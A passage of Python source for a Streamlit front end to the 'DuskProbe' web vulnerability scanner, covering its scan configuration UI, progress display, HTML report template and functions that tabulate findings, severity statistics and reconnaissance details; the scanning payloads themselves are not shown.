                <h2>📋 Technical Appendix</h2>
                
                <h3>🔧 Scan Configuration</h3>
                <table>
                    <tr><th>Parameter</th><th>Value</th></tr>
                    <tr><td>Scanner Version</td><td>DuskProbe v5.0 Streamlit</td></tr>
                    <tr><td>Scan Date</td><td>{datetime.now().strftime('%Y-%m-%d')}</td></tr>
                    <tr><td>Scan Time</td><td>{datetime.now().strftime('%H:%M:%S UTC')}</td></tr>
                    <tr><td>Total URLs</td><td>{len(results)}</td></tr>
                    <tr><td>Total Tests</td><td>140+ vulnerability payloads</td></tr>
                </table>
                
                <h3>⚖️ Legal and Compliance</h3>
                <div class="vulnerability-card info">
                    <p><strong>AUTHORIZED USE ONLY:</strong> This security assessment was conducted for authorized security testing purposes only. 
                    Use of this tool on systems without explicit permission may violate computer crime laws including but not limited to:</p>
                    <ul>
                        <li>Computer Fraud and Abuse Act (CFAA) in the United States</li>
                        <li>General Data Protection Regulation (GDPR) in the European Union</li>
                        <li>Computer Misuse Act in the United Kingdom</li>
                        <li>Local and international cybersecurity regulations</li>
                    </ul>
                    <p><strong>Disclaimer:</strong> This report is provided for informational purposes only. The scanner author and operators assume no responsibility for any damages or legal consequences arising from the use of this information.</p>
                </div>
            </div>
            
            <div class="footer">
                <p>Generated by <strong>DuskProbe v5.0</strong> | Advanced Web Application Security Scanner</p>
                <p>Developed by <strong>Labib Bin Shahed</strong> | For authorized security testing only</p>
                <p>Report generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
            </div>
        </div>
        
        <script>
            // Add smooth scrolling for navigation links
            document.querySelectorAll('a[href^="#"]').forEach(anchor => {{
                anchor.addEventListener('click', function (e) {{
                    e.preventDefault();
                    document.querySelector(this.getAttribute('href')).scrollIntoView({{
                        behavior: 'smooth'
                    }});
                }});
            }});
        </script>
    </body>
    </html>
    """
    
    return html_content

def main():
    """Main Streamlit application."""
    
    # Configure page
    st.set_page_config(
        page_title="DuskProbe Security Scanner",
        page_icon="🔍",
        layout="wide",
        initial_sidebar_state="expanded"
    )
    
    # Main title and description
    st.title("🔍 DuskProbe Security Scanner")
    st.markdown("### Advanced Web Application Vulnerability Assessment Tool")
    
    # Display version and author info
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.info("""
        **Version:** 5.0.0  
        **Developer:** Labib Bin Shahed  
        **GitHub:** https://github.com/la-b-ib  
        **License:** MIT License - Educational & Professional Use
        """)
    
    # Legal disclaimer
    with st.expander("⚠️ Legal Disclaimer - MUST READ", expanded=False):
        st.error("""
        **AUTHORIZED USE ONLY**: This cybersecurity assessment tool is exclusively intended 
        for legitimate security professionals, penetration testers, and authorized 
        personnel conducting lawful security evaluations with explicit written consent.
        
        By using this software, you certify that you possess valid authorization 
        from the target system owner(s) and acknowledge full compliance with all 
        applicable federal, state, local, and international cybersecurity regulations.
        
        **WARNING**: Unauthorized scanning, testing, or access to computer systems 
        may constitute a criminal offense under computer fraud and abuse laws. 
        Users assume complete legal responsibility for all scanning activities.
        """)
    
    # Sidebar for configuration
    st.sidebar.header("🛠️ Scan Configuration")
    
    # URL input methods
    scan_method = st.sidebar.radio(
        "Choose scan method:",
        ["Single URL", "Multiple URLs", "Batch File Upload"]
    )
    
    urls_to_scan = set()
    
    if scan_method == "Single URL":
        url = st.sidebar.text_input("🌐 Target URL:", placeholder="https://example.com")
        if url:
            urls_to_scan.add(url)
    
    elif scan_method == "Multiple URLs":
        urls_text = st.sidebar.text_area(
            "🌐 Target URLs (one per line):",
            placeholder="https://example1.com\nhttps://example2.com\nhttps://example3.com"
        )
        if urls_text:
            urls_to_scan.update(line.strip() for line in urls_text.split('\n') if line.strip())
    
    elif scan_method == "Batch File Upload":
        uploaded_file = st.sidebar.file_uploader("📁 Upload batch file", type=['txt'])
        if uploaded_file is not None:
            content = uploaded_file.getvalue().decode('utf-8')
            urls_to_scan.update(line.strip() for line in content.split('\n') 
                              if line.strip() and not line.strip().startswith('#'))
    
    # Scan options
    st.sidebar.subheader("⚙️ Scan Options")
    
    enable_crawl = st.sidebar.checkbox("🕷️ Enable URL crawling", value=False, 
                                     help="Discover additional URLs from the target website")
    
    use_tor = st.sidebar.checkbox("🔒 Use Tor network", value=False,
                                help="Route traffic through Tor (requires Tor service)")
    
    # Output options
    st.sidebar.subheader("📊 Output Options")
    
    report_format = st.sidebar.selectbox(
        "Report format:",
        ["json", "html", "csv", "text"],
        index=0
    )
    
    verbose_output = st.sidebar.checkbox("🔍 Verbose output", value=False,
                                       help="Enable detailed logging and output")
    
    # Scan button
    if st.sidebar.button("🚀 Start Scan", type="primary", disabled=not urls_to_scan or st.session_state.scan_in_progress):
        if not urls_to_scan:
            st.sidebar.error("Please provide at least one URL to scan")
        else:
            # Prepare scan configuration
            scan_config = {
                'urls': list(urls_to_scan),
                'crawl': enable_crawl,
                'tor': use_tor,
                'format': report_format,
                'verbose': verbose_output
            }
            
            # Start scan
            start_scan(scan_config)
    
    # Main content area
    if st.session_state.scan_in_progress:
        display_scan_progress()
    elif st.session_state.scan_results:
        display_scan_results()
    else:
        display_welcome_screen()

def display_welcome_screen():
    """Display welcome screen with feature overview."""
    st.markdown("## 🎯 Welcome to DuskProbe Security Scanner")
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.markdown("""
        ### 🔍 Key Features:
        - **XSS Detection**: Cross-site scripting vulnerability scanning
        - **SQL Injection**: Database injection vulnerability testing  
        - **LFI/RFI**: Local and Remote File Inclusion detection
        - **Command Injection**: System command injection testing
        - **SSL/TLS Analysis**: Certificate and security configuration check
        - **Directory Discovery**: Hidden directory and file enumeration
        - **Header Analysis**: Security header configuration review
        - **Technology Detection**: Framework and library identification
        """)
    
    with col2:
        st.markdown("""
        ### 🚀 Getting Started:
        1. **Configure your scan** using the sidebar options
        2. **Enter target URL(s)** or upload a batch file
        3. **Adjust scan settings** according to your needs
        4. **Start the scan** and monitor progress
        5. **Review results** and download reports
        
        ### ⚡ Performance:
        - **Asynchronous scanning** for maximum speed
        - **Concurrent requests** with rate limiting
        - **Smart caching** to avoid duplicate work
        - **Progress tracking** with real-time updates
        """)
    
    # Feature matrix
    st.markdown("### 🔧 Available Security Checks")
    
    features_data = {
        'Security Check': [
            'Cross-Site Scripting (XSS)',
            'SQL Injection',
            'Local File Inclusion (LFI)', 
            'Remote File Inclusion (RFI)',
            'Command Injection',
            'SSL/TLS Configuration',
            'HTTP Security Headers',
            'Directory Enumeration',
            'Technology Stack Detection',
            'Cookie Security Analysis'
        ],
        'Status': ['✅'] * 10,
        'Risk Level': [
            'High', 'Critical', 'High', 'Critical', 'Critical',
            'Medium', 'Medium', 'Low', 'Info', 'Medium'
        ]
    }
    
    if PD_AVAILABLE:
        df = pd.DataFrame(features_data)
        st.dataframe(df, use_container_width=True)
    else:
        for i, check in enumerate(features_data['Security Check']):
            st.write(f"{features_data['Status'][i]} **{check}** - Risk: {features_data['Risk Level'][i]}")

def start_scan(config):
    """Initialize and start the security scan."""
    st.session_state.scan_in_progress = True
    st.session_state.current_scan_status = "Initializing scan..."
    
    # Run the async scan
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        results = loop.run_until_complete(run_async_scan(config))
        st.session_state.scan_results = results
        st.session_state.scan_in_progress = False
        st.session_state.current_scan_status = "Scan completed!"
    except Exception as e:
        st.session_state.scan_in_progress = False
        st.session_state.current_scan_status = f"Scan failed: {str(e)}"
        st.error(f"Scan failed: {str(e)}")
    finally:
        loop.close()
    
    st.rerun()

async def run_async_scan(scan_config):
    """Run the actual async scan."""
    config = StreamlitConfig(scan_config)
    urls_to_scan = set(scan_config['urls'])
    
    # Handle crawling if enabled
    if scan_config.get('crawl', False):
        initial_urls = list(urls_to_scan)
        async with AsyncSession(config) as session:
            for url in initial_urls:
                crawled_links = await simple_crawl(session, url, max_depth=1)
                urls_to_scan.update(crawled_links)
    
    all_results = []
    
    # Run scans for each URL
    async with AsyncSession(config) as session:
        checker = SecurityChecker(session, config)
        
        for i, url in enumerate(urls_to_scan):
            # Update progress through session state
            progress_percent = int((i / len(urls_to_scan)) * 100)
            st.session_state.current_scan_status = f"Scanning {url} ({i+1}/{len(urls_to_scan)})"
            
            def progress_callback(message, percent):
                st.session_state.current_scan_status = f"{message} ({percent}%)"
            
            result = await checker.full_check(url, progress_callback)
            all_results.append(result)
    
    return all_results

def display_scan_progress():
    """Display scan progress and status."""
    st.markdown("## 🔄 Scan in Progress")
    
    # Progress information
    col1, col2 = st.columns([3, 1])
    
    with col1:
        # Status text
        if st.session_state.current_scan_status:
            st.info(f"**Status:** {st.session_state.current_scan_status}")
        else:
            st.info("**Status:** Initializing...")
    
    with col2:
        # Stop scan button
        if st.button("🛑 Stop Scan", type="secondary"):
            st.session_state.scan_in_progress = False
            st.session_state.current_scan_status = "Scan stopped by user"
            st.warning("Scan stopped by user")
            st.rerun()
    
    # Progress bar (simplified since we can't update it in real-time easily)
    progress_placeholder = st.empty()
    
    # Show a pulsing progress bar
    progress_bar = st.progress(0)
    
    # Simulate some basic progress indication
    if "%" in st.session_state.current_scan_status:
        try:
            # Extract percentage from status message
            percent_str = st.session_state.current_scan_status.split('(')[-1].split('%')[0]
            if percent_str.isdigit():
                progress_value = int(percent_str) / 100
                progress_bar.progress(progress_value)
            else:
                progress_bar.progress(0.5)  # Default middle value
        except:
            progress_bar.progress(0.5)
    else:
        progress_bar.progress(0.5)
    
    # Live status updates
    st.markdown("### 📊 Scan Activity")
    
    # Show current scan details in a container
    status_container = st.container()
    with status_container:
        if st.session_state.current_scan_status:
            st.write(f"**Current Activity:** {st.session_state.current_scan_status}")
        
        # Show scanning phases
        scan_phases = [
            "🔍 Reconnaissance",
            "🧪 Vulnerability Testing", 
            "📋 Report Generation"
        ]
        
        # Simple phase indication based on status
        current_phase = "🔍 Reconnaissance"
        if "vulnerability" in st.session_state.current_scan_status.lower():
            current_phase = "🧪 Vulnerability Testing"
        elif "finalizing" in st.session_state.current_scan_status.lower():
            current_phase = "📋 Report Generation"
        
        st.write(f"**Current Phase:** {current_phase}")
    
    # Auto-refresh every 2 seconds while scanning
    if st.session_state.scan_in_progress:
        time.sleep(2)
        st.rerun()

def display_scan_results():
    """Display scan results and findings in CLI-identical format."""
    st.markdown("## 📋 Security Assessment Results")
    
    if not st.session_state.scan_results:
        st.warning("No scan results available.")
        return
    
    results = st.session_state.scan_results
    
    # Aggregate all findings from all scanned URLs
    all_findings = []
    all_site_info = {}
    total_checks = 0
    
    for result in results:
        findings = result.get('findings', [])
        all_findings.extend(findings)
        site_info = result.get('site_info', {})
        if site_info:
            all_site_info.update(site_info)
        total_checks += result.get('total_checks', 0)
    
    if not all_findings:
        st.success("✅ **NO VULNERABILITIES FOUND!** - Excellent security posture!")
        _display_technical_intelligence(all_site_info)
        _display_advanced_intelligence(all_site_info)
        _display_comprehensive_discovery_analysis(all_site_info)
        _display_website_structure_analysis(all_site_info)
        return
    
    # Display comprehensive summary (CLI-style)
    _display_summary(all_site_info, all_findings, total_checks)
    
    # Display detailed vulnerability table (exact CLI format)
    _display_detailed_table(all_findings)
    
    # Display vulnerability analysis
    _display_vulnerability_analysis(all_findings)
    
    # Display technical intelligence
    _display_technical_intelligence(all_site_info)
    
    # Display advanced intelligence  
    _display_advanced_intelligence(all_site_info)
    
    # Display comprehensive discovery analysis
    _display_comprehensive_discovery_analysis(all_site_info)
    
    # Display website structure analysis
    _display_website_structure_analysis(all_site_info)
    
    # Display per-URL vulnerability analysis
    _display_per_url_vulnerabilities(results)
    
    # Display remediation guide
    _display_remediation_guide(all_findings)
    
    # Display graph visualizations
    _display_graph_visualizations(all_findings)
    
    # Action buttons
    st.markdown("### 📥 Export & Actions")
    
    col1, col2, col3, col4 = st.columns(4)
    
    with col1:
        if st.button("🔄 Run New Scan"):
            st.session_state.scan_results = None
            st.rerun()
    
    with col2:
        # JSON Report
        report_data = generate_report(st.session_state.scan_results)
        if report_data:
            st.download_button(
                label="� Download JSON Report",
                data=json.dumps(report_data, indent=2),
                file_name=f"duskprobe_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                mime="application/json"
            )
    
    with col3:
        # CSV Report
        if PD_AVAILABLE:
            csv_data = generate_csv_report(st.session_state.scan_results)
            st.download_button(
                label="📥 Download CSV Report", 
                data=csv_data,
                file_name=f"duskprobe_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                mime="text/csv"
            )
    
    with col4:
        # HTML Report (CLI-identical)
        html_report = generate_html_report(st.session_state.scan_results)
        st.download_button(
            label="📥 Download HTML Report",
            data=html_report,
            file_name=f"duskprobe_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html",
            mime="text/html"
        )


def _display_summary(site_info, findings, total_checks):
    """Enhanced summary with comprehensive site information (CLI-identical)."""
    st.markdown("### 🔍 Security Assessment Overview")
    
    # Calculate security posture
    security_posture = _assess_security_posture(findings)
    scan_duration = f"{len(findings) * 0.1:.1f}s"  # Estimated duration
    
    # Create summary info in structured format
    summary_data = {
        "Target URL": site_info.get('url', 'N/A'),
        "IP Address": site_info.get('ip_address', 'N/A'),
        "Server Software": site_info.get('server', 'N/A'),
        "Total Security Checks": str(total_checks),
        "Scan Duration": scan_duration,
        "Security Posture": security_posture
    }
    
    if site_info.get('technologies'):
        summary_data["Detected Technologies"] = ', '.join(site_info.get('technologies', []))
    
    # Display as formatted info boxes
    cols = st.columns(2)
    items = list(summary_data.items())
    for i, (key, value) in enumerate(items):
        with cols[i % 2]:
            st.info(f"**{key}:** {value}")


def _display_detailed_table(findings):
    """Display comprehensive vulnerability table with extensive details (CLI-identical)."""
    if not findings:
        return
        
    st.markdown("### 🚨 Comprehensive Vulnerability Analysis Report")
    
    # Create DataFrame with all 14 columns from CLI version
    table_data = []
    
    # Sort by risk score for priority presentation
    sorted_findings = sorted(
        findings, 
        key=lambda x: (x.get('risk_score', 0), _severity_to_num(x.get('severity', 'INFO'))), 
        reverse=True
    )
    
    for finding in sorted_findings:
        # Get comprehensive details with enhanced parameters
        severity = finding.get('severity', 'INFO')
        category = _truncate_text(finding.get('vulnerability_category', '🔍 Uncategorized'), 18)
        vuln_type = _truncate_text(finding.get('type', 'N/A'), 13)
        
        # CVE/CWE information
        cve_refs = finding.get('cve_references', ['N/A'])
        cwe_id = finding.get('cwe_id', 'N/A')
        cve_cwe = f"CVE: {', '.join(cve_refs[:1])}\nCWE: {cwe_id}"
        
        # Scoring
        cvss_score = f"{finding.get('cvss_score', 0.0):.1f}/10.0"
        risk_score = f"{finding.get('risk_score', 0)}/100"
        owasp_category = _truncate_text(finding.get('owasp_category', 'N/A'), 16)
        
        # Enhanced URL/Component information
        url = finding.get('url', 'N/A')
        component_details = finding.get('details', '')
        affected_component = _truncate_text(url, 25)
        if component_details and 'missing' in component_details.lower():
            header_name = component_details.replace('Missing ', '').replace('missing ', '')
            affected_component += f"\n📍 {_truncate_text(header_name, 15)}"
        elif component_details:
            affected_component += f"\n🔍 {_truncate_text(component_details, 15)}"
        
        # Enhanced technical details
        exploit_diff = finding.get('exploit_difficulty', 'Unknown')
        attack_vector = finding.get('attack_vector', 'Unknown')
        business_impact = _truncate_text(finding.get('business_impact', _assess_business_impact(finding)), 13)
        
        # New enhanced parameters
        remediation_priority = _calculate_remediation_priority(finding)
        detection_time = _format_detection_time(finding.get('timestamp', ''))
        technical_details = _get_enhanced_technical_details(finding)
        
        table_data.append({
            'Severity': severity,
            'Category': category,
            'Vulnerability Type': vuln_type,
            'CVE/CWE': cve_cwe,
            'CVSS Score': cvss_score,
            'Risk Score': risk_score,
            'OWASP 2025': owasp_category,
            'Affected URL/Component': affected_component,
            'Exploit Difficulty': exploit_diff,
            'Attack Vector': attack_vector,
            'Business Impact': business_impact,
            'Remediation Priority': remediation_priority,
            'Detection Time': detection_time,
            'Technical Details': technical_details
        })
    
    if PD_AVAILABLE and table_data:
        df = pd.DataFrame(table_data)
        
        # Apply color coding based on severity
        def highlight_severity(val):
            if 'CRITICAL' in str(val):
                return 'background-color: #ffebee; color: #d32f2f; font-weight: bold'
            elif 'HIGH' in str(val):
                return 'background-color: #fff3e0; color: #f57c00; font-weight: bold'
            elif 'MEDIUM' in str(val):
                return 'background-color: #fffde7; color: #f9a825; font-weight: bold'
            elif 'LOW' in str(val):
                return 'background-color: #e8f5e8; color: #388e3c; font-weight: bold'
            return ''
        
        # Style the dataframe
        styled_df = df.style.map(highlight_severity, subset=['Severity'])
        st.dataframe(styled_df, width=1400, height=600)
        
        # Also show summary statistics
        st.markdown("#### � Vulnerability Statistics")
        severity_counts = df['Severity'].value_counts()
        stat_cols = st.columns(len(severity_counts))
        
        for i, (severity, count) in enumerate(severity_counts.items()):
            with stat_cols[i]:
                color = {
                    'CRITICAL': '🔴',
                    'HIGH': '🟠', 
                    'MEDIUM': '🟡',
                    'LOW': '🔵',
                    'INFO': '⚪'
                }.get(str(severity), '⚪')
                st.metric(f"{color} {severity}", count)
    else:
        # Fallback display without pandas
        for item in table_data[:10]:  # Show first 10 items
            with st.expander(f"� {item['Severity']} - {item['Vulnerability Type']}"):
                for key, value in item.items():
                    st.write(f"**{key}:** {value}")


def _display_vulnerability_analysis(findings):
    """Display detailed vulnerability analysis and statistics (CLI-identical)."""
    if not findings:
        return

    st.markdown("### 📈 Comprehensive Vulnerability Analysis")
    
    # Comprehensive statistics
    stats = _calculate_comprehensive_stats(findings)
    
    # Display analysis
    analysis_data = {
        "Total Vulnerabilities": stats['total'],
        "Critical": stats['critical'],
        "High": stats['high'], 
        "Medium": stats['medium'],
        "Low": stats['low'],
        "Average CVSS Score": f"{stats['avg_cvss']:.1f}/10.0",
        "Average Risk Score": f"{stats['avg_risk']}/100",
        "Exploitable Vulnerabilities": stats['exploitable'],
        "Compliance Violations": stats['compliance_issues']
    }
    
    # Display stats in columns
    stat_cols = st.columns(3)
    items = list(analysis_data.items())
    for i, (key, value) in enumerate(items):
        with stat_cols[i % 3]:
            st.info(f"**{key}:** {value}")
    
    # Attack Vector Analysis
    st.markdown("#### 🎯 Attack Vector Analysis")
    vector_cols = st.columns(len(stats['attack_vectors']))
    for i, (vector, count) in enumerate(stats['attack_vectors'].items()):
        with vector_cols[i]:
            st.metric(f"📊 {vector}", count)
    
    # OWASP Category Breakdown
    st.markdown("#### 📋 OWASP 2025 Category Breakdown")
    owasp_cols = st.columns(len(stats['owasp_categories']))
    for i, (category, count) in enumerate(stats['owasp_categories'].items()):
        with owasp_cols[i]:
            st.metric(f"🏷️ {category}", count)
    
    # Business Impact Assessment
    st.markdown("#### 🏢 Business Impact Assessment")
    impact_data = {
        "Data Breach Risk": stats['data_breach_risk'],
        "Service Disruption Risk": stats['service_disruption_risk'],
        "Compliance Risk": stats['compliance_risk'],
        "Reputation Risk": stats['reputation_risk']
    }
    
    impact_cols = st.columns(2)
    items = list(impact_data.items())
    for i, (key, value) in enumerate(items):
        with impact_cols[i % 2]:
            if "HIGH" in str(value):
                st.error(f"**{key}:** {value}")
            elif "MEDIUM" in str(value):
                st.warning(f"**{key}:** {value}")
            else:
                st.info(f"**{key}:** {value}")


# Helper functions for table display
def _truncate_text(text, max_length):
    """Truncate text to specified length."""
    if len(str(text)) <= max_length:
        return str(text)
    return str(text)[:max_length-3] + "..."

def _severity_to_num(severity):
    """Convert severity string to numeric value for sorting."""
    severity_map = {
        'CRITICAL': 4,
        'HIGH': 3,
        'MEDIUM': 2,
        'LOW': 1,
        'INFO': 0
    }
    return severity_map.get(severity.upper(), 0)

def _assess_security_posture(findings):
    """Assess overall security posture based on findings."""
    if not findings:
        return "🟢 EXCELLENT"
    
    critical_count = len([f for f in findings if f.get('severity') == 'CRITICAL'])
    high_count = len([f for f in findings if f.get('severity') == 'HIGH'])
    
    if critical_count > 0:
        return "🔴 CRITICAL"
    elif high_count > 5:
        return "🟠 POOR"
    elif high_count > 0:
        return "🟡 MODERATE"
    else:
        return "🟢 GOOD"

def _assess_business_impact(finding):
    """Assess business impact of a finding."""
    severity = finding.get('severity', 'INFO')
    vuln_type = finding.get('type', '')
    
    if severity == 'CRITICAL':
        if 'injection' in vuln_type.lower():
            return "Data Breach Risk"
        return "System Compromise"
    elif severity == 'HIGH':
        return "Security Bypass"
    elif severity == 'MEDIUM':
        return "Information Disclosure"
    else:
        return "Reconnaissance"

def _calculate_remediation_priority(finding):
    """Calculate remediation priority."""
    severity = finding.get('severity', 'INFO')
    risk_score = finding.get('risk_score', 0)
    
    if severity == 'CRITICAL' or risk_score >= 80:
        return "🚨 IMMEDIATE"
    elif severity == 'HIGH' or risk_score >= 60:
        return "🟠 URGENT"
    elif severity == 'MEDIUM' or risk_score >= 40:
        return "🟡 PLANNED"
    else:
        return "🔵 ROUTINE"

def _format_detection_time(timestamp):
    """Format detection timestamp."""
    if not timestamp:
        return "N/A"
    try:
        if isinstance(timestamp, str):
            dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
        else:
            dt = timestamp
        return dt.strftime("%H:%M:%S")
    except:
        return "N/A"

def _get_enhanced_technical_details(finding):
    """Get enhanced technical details for finding."""
    details = finding.get('details', '')
    vuln_type = finding.get('type', '')
    
    # Add specific technical information based on vulnerability type
    if 'XSS' in vuln_type:
        return f"Script Injection\n{_truncate_text(details, 15)}"
    elif 'SQL' in vuln_type:
        return f"Database Query\n{_truncate_text(details, 15)}"
    elif 'Header' in vuln_type:
        return f"HTTP Header\n{_truncate_text(details, 15)}"
    else:
        return _truncate_text(details, 20)

def _calculate_comprehensive_stats(findings):
    """Calculate comprehensive statistics for vulnerability analysis."""
    stats = {
        'total': len(findings),
        'critical': len([f for f in findings if f.get('severity') == 'CRITICAL']),
        'high': len([f for f in findings if f.get('severity') == 'HIGH']),
        'medium': len([f for f in findings if f.get('severity') == 'MEDIUM']),
        'low': len([f for f in findings if f.get('severity') == 'LOW']),
        'exploitable': len([f for f in findings if f.get('risk_score', 0) >= 70]),
        'compliance_issues': len([f for f in findings if 'compliance' in f.get('type', '').lower()]),
        'attack_vectors': {},
        'owasp_categories': {},
        'data_breach_risk': 'LOW',
        'service_disruption_risk': 'LOW',
        'compliance_risk': 'LOW',
        'reputation_risk': 'LOW'
    }
    
    # Calculate averages
    cvss_scores = [f.get('cvss_score', 0.0) for f in findings if f.get('cvss_score')]
    stats['avg_cvss'] = sum(cvss_scores) / len(cvss_scores) if cvss_scores else 0.0
    
    risk_scores = [f.get('risk_score', 0) for f in findings if f.get('risk_score')]
    stats['avg_risk'] = int(sum(risk_scores) / len(risk_scores)) if risk_scores else 0
    
    # Attack vectors
    for finding in findings:
        vector = finding.get('attack_vector', 'Unknown')
        stats['attack_vectors'][vector] = stats['attack_vectors'].get(vector, 0) + 1
    
    # OWASP categories
    for finding in findings:
        category = finding.get('owasp_category', 'Unknown')
        stats['owasp_categories'][category] = stats['owasp_categories'].get(category, 0) + 1
    
    # Assess risks
    if stats['critical'] > 0:
        stats['data_breach_risk'] = 'HIGH'
        stats['reputation_risk'] = 'HIGH'
    elif stats['high'] > 3:
        stats['data_breach_risk'] = 'MEDIUM'
        stats['service_disruption_risk'] = 'MEDIUM'
    
    return stats


# Placeholder functions for other displays (to be implemented)
def _display_technical_intelligence(site_info):
    """Display comprehensive technical reconnaissance information (CLI-identical)."""
    if not site_info:
        st.markdown("### 🕵️ Technical Intelligence")
        st.info("No technical information available.")
        return
    
    st.markdown("### 🕵️ Enhanced Technical Intelligence & Reconnaissance Report")
    
    # Create comprehensive technical information
    tech_data = []
    
    # 🖥️ Server & Hosting Information
    server_software = site_info.get('server_software', site_info.get('server', 'Unknown'))
    server_version = site_info.get('server_version', 'Unknown')
    base_url = site_info.get('url', 'N/A')
    
    if server_software != 'Unknown':
        tech_data.append({
            'Category': '🖥️ Server Software',
            'Technology/Component': f"{server_software}\nVersion: {server_version}",
            'Details & Affected URLs': f"Web server technology running the application\n🌐 Base URL: {base_url}\n📍 Headers exposed: Server header",
            'Security Notes': "Check for known vulnerabilities in server version" if server_software != 'Unknown' else "Server software hidden - security by obscurity",
            'Risk Level': "🟡 MEDIUM" if server_software != 'Unknown' else "🟢 LOW",
            'Additional Info': f"Fingerprint: {server_software[:10]}..." if len(server_software) > 10 else server_software
        })
    
    # IP Address & Infrastructure with geolocation
    ip_address = site_info.get('ip_address', 'Unknown')
    hosting_country = site_info.get('hosting_country', 'Unknown')
    isp = site_info.get('isp', 'Unknown')
    
    if ip_address != 'Unknown':
        tech_data.append({
            'Category': '🌐 IP Address',
            'Technology/Component': f"{ip_address}\nISP: {isp}",
            'Details & Affected URLs': f"Primary server IP address\n🌍 Location: {hosting_country}\n📍 All endpoints resolve to this IP",
            'Security Notes': "Public IP exposure analysis required" if ip_address != 'Unknown' else "IP resolution failed",
            'Risk Level': "🟡 MEDIUM" if ip_address != 'Unknown' else "🔴 HIGH",
            'Additional Info': f"Geo: {hosting_country}" if hosting_country != 'Unknown' else "Unknown location"
        })
    
    # Cloud Provider with service details
    cloud_provider = site_info.get('cloud_provider', 'Unknown')
    hosting_service = site_info.get('hosting_service', 'Unknown')
    
    if cloud_provider != 'Unknown':
        tech_data.append({
            'Category': '☁️ Cloud Provider',
            'Technology/Component': f"{cloud_provider}\nService: {hosting_service}",
            'Details & Affected URLs': f"Hosting infrastructure provider\n🔗 Service endpoints: {base_url}\n📊 Infrastructure metadata exposed",
            'Security Notes': "Review cloud security configurations" if cloud_provider != 'Unknown' else "Self-hosted or unknown provider",
            'Risk Level': "🟡 MEDIUM" if cloud_provider != 'Unknown' else "🟢 LOW",
            'Additional Info': f"Platform: {cloud_provider}" if cloud_provider != 'Unknown' else "On-premise"
        })
    
    # CDN Detection with endpoints
    cdn_detected = site_info.get('cdn_detected', 'Not detected')
    cdn_provider = site_info.get('cdn_provider', 'N/A')
    
    tech_data.append({
        'Category': '🚀 CDN Usage',
        'Technology/Component': f"{cdn_detected}\nProvider: {cdn_provider}",
        'Details & Affected URLs': f"Content Delivery Network implementation\n🌐 CDN endpoints: {base_url}\n⚡ Edge servers detected",
        'Security Notes': "CDN bypassing techniques may be possible" if cdn_detected != 'Not detected' else "No CDN protection - direct server access",
        'Risk Level': "🟢 LOW" if cdn_detected != 'Not detected' else "🟡 MEDIUM",
        'Additional Info': f"Edge locations: {'Multiple' if cdn_detected != 'Not detected' else 'None'}"
    })
    
    # Web Application Firewall with bypass info
    waf_detected = site_info.get('waf_detected', 'Not detected')
    waf_vendor = site_info.get('waf_vendor', 'N/A')
    
    tech_data.append({
        'Category': '🛡️ WAF Detection',
        'Technology/Component': f"{waf_detected}\nVendor: {waf_vendor}",
        'Details & Affected URLs': f"Web Application Firewall protection\n🔗 Protected endpoints: {base_url}\n🛡️ Filter rules detected",
        'Security Notes': "WAF bypass techniques required for testing" if waf_detected != 'Not detected' else "No WAF protection detected - direct application access",
        'Risk Level': "🟢 LOW" if waf_detected != 'Not detected' else "🔴 HIGH",
        'Additional Info': f"Vendor: {waf_vendor}" if waf_vendor != 'N/A' else "Unknown vendor"
    })
    
    # 🧱 Backend Stack Information
    programming_language = site_info.get('programming_language', 'Unknown')
    language_version = site_info.get('language_version', 'Unknown')
    framework_endpoints = site_info.get('framework_endpoints', [])
    
    if programming_language != 'Unknown':
        tech_data.append({
            'Category': '💻 Programming Language',
            'Technology/Component': f"{programming_language}\nVersion: {language_version}",
            'Details & Affected URLs': f"Backend development language\n� Framework hints: {', '.join(framework_endpoints[:2]) if framework_endpoints else 'N/A'}\n📁 Language-specific paths detected",
            'Security Notes': "Language-specific vulnerability research required" if programming_language != 'Unknown' else "Programming language hidden",
            'Risk Level': "🟡 MEDIUM" if programming_language != 'Unknown' else "🟢 LOW",
            'Additional Info': f"Runtime: {programming_language}" if programming_language != 'Unknown' else "Unknown runtime"
        })
    
    # Web Framework
    web_framework = site_info.get('web_framework', 'Unknown')
    framework_version = site_info.get('framework_version', 'Unknown')
    admin_urls = site_info.get('admin_urls', [])
    
    if web_framework != 'Unknown':
        tech_data.append({
            'Category': '🧱 Web Framework',
            'Technology/Component': f"{web_framework}\nVersion: {framework_version}",
            'Details & Affected URLs': f"Application development framework\n🔗 Admin interfaces: {', '.join(admin_urls[:2]) if admin_urls else 'None detected'}\n⚙️ Framework-specific paths found",
            'Security Notes': "Framework-specific security assessment needed" if web_framework != 'Unknown' else "Framework not identified",
            'Risk Level': "🟡 MEDIUM" if web_framework != 'Unknown' else "🟢 LOW",
            'Additional Info': f"Framework: {web_framework[:10]}..." if len(web_framework) > 10 else web_framework
        })
    
    # Database Technology
    database_hints = site_info.get('database_hints', [])
    db_endpoints = site_info.get('database_endpoints', [])
    
    if database_hints:
        tech_data.append({
            'Category': '🗄️ Database Technology',
            'Technology/Component': f"{', '.join(database_hints)}\nEndpoints: {len(db_endpoints)} found",
            'Details & Affected URLs': f"Backend database systems detected\n🔗 DB interfaces: {', '.join(db_endpoints[:2]) if db_endpoints else 'None exposed'}\n💾 Database fingerprinting successful",
            'Security Notes': "Database-specific injection testing required",
            'Risk Level': "🔴 HIGH" if db_endpoints else "🟡 MEDIUM",
            'Additional Info': f"DB Count: {len(database_hints)}"
        })
    
    # Security Headers Analysis
    security_headers = site_info.get('security_headers', {})
    
    if security_headers:
        missing_headers = [k for k, v in security_headers.items() if v == 'Missing']
        present_headers = [k for k, v in security_headers.items() if v != 'Missing']
        
        tech_data.append({
            'Category': '🔒 Security Headers',
            'Technology/Component': f"Present: {len(present_headers)}\nMissing: {len(missing_headers)}",
            'Details & Affected URLs': f"HTTP security header implementation\n🔗 Missing headers: {', '.join(missing_headers[:3])}\n🛡️ Security posture analysis",
            'Security Notes': f"Missing critical security headers: {', '.join(missing_headers[:2])}" if missing_headers else "Good security header implementation",
